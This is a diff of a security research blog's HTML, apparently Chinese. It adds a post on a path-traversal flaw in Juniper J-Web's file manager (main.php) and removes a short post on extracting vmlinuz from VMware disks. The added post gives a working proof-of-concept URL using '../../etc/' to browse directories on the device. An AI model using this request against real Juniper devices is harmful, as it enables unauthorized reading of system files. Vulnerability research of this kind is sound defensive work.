@@ -207,6 +207,84 @@
   
     
       <article
+id="post-juniper-1day-任意目录读"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/">juniper-1day-任意目录读</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h2><p>junos-vsrx3-x86-64-20.3R1.8.ide.ova</p>
+<h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><p>漏洞存在于 <code>html\modules\manage\files\main.php</code> 中</p>
+<pre><code>function
+do_manage_files ()
+&#123;
+    ......
+
+        case MANAGE_FILES_BROWSE:
+            // Browse (Download and Delete) files
+            $path = get_val_or_null($_GET, &#39;path&#39;);
+            漏洞存在于这里,这里只验证了path是否存在，未验证路径是否合法
+            if (do_manage_files_validate_file($path, null)) &#123;
+                $sections = do_manage_files_browse($path);
+                break;
+            &#125; else &#123;
+                 $sections = do_manage_files_main();
+             &#125;
+            break;
+    &#125;
+
+  .....
+&#125;
+</code></pre>
+<p>利用 poc</p>
+<pre><code>https://192.168.1.100/manage?m[]=files&amp;action=browse&amp;path=/var/log/../../etc/
+</code></pre>
+<p><img src="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/boxcnpZx0PSdeZkzE19ylKJJD3d.png"></p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2023-02-24T12:25:01.000Z" itemprop="datePublished">2023-02-24</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Juniper/" rel="tag">Juniper</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
 id="post-juniper-jweb环境搭建"
 class="article article-type-post"
 >
@@ -637,58 +715,6 @@ sudo chroot . /sbin/ftar -xf /bin.tar
 
     
   
-    
-      <article
-id="post-利用VMware获取shell"
-class="article article-type-post"
->
-
-
-
-<div class="article-inner">
-    
-
-    <div class="article-body">
-    <header class="article-title">
-        <a href="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/">利用VMware获取shell</a>
-    </header>
-    <div class="article-entry post-inner-html">
-        
-        <h2 id="获取-vmlinuz"><a href="#获取-vmlinuz" class="headerlink" title="获取 vmlinuz"></a>获取 vmlinuz</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>对于 vmdk 没有加密的虚拟设备来说，可以直接通过挂载磁盘的方式提取出 vmlinuz 文件，但是要注意磁盘中的内核文件命名可能不同！！！</p>
-<p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2cjTeNLk3cdxSy6yrkdxef.png"></p>
-        
-    </div>
-    </div>
-
-    <div class="article-badge">
-        
-        
-    </div>
-
-</div>
-
-<footer class="article-footer">
-    <div class="article-more-info">
-    <div class="article-date">
-  <time datetime="2023-02-06T05:46:36.000Z" itemprop="datePublished">2023-02-06</time>
-</div>
-    
-        <div class="article-category">
-        <a class="article-category-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
-        </div>
-    
-    
-        <div class="article-tag">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FortiGate/" rel="tag">FortiGate</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
-        </div>
-    
-    </div>
-</footer>
-
-</article>
-
-    
-  
 
   
     <nav class="pagination">
@@ -736,6 +762,10 @@ class="article article-type-post"
       <ul>
         
           <li>
+            <a href="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/">juniper-1day-任意目录读</a>
+          </li>
+        
+          <li>
             <a href="/2023/02/23/juniper-jweb%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">juniper-jweb环境搭建</a>
           </li>
         
@@ -749,10 +779,6 @@ class="article article-type-post"
         
           <li>
             <a href="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">RT-AX55环境搭建</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/">libnvram.so编译教程</a>
           </li>
         
       </ul>
